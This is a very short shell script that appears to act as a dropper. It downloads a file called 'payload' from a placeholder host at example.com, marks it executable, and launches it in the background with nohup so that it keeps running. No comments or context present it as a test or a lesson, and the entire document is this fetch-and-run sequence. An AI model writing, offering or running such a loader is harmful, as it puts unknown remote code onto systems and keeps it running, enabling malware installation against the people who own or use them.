#!/bin/sh
curl -o /tmp/payload https://example.com/payload
chmod +x /tmp/payload
nohup /tmp/payload &
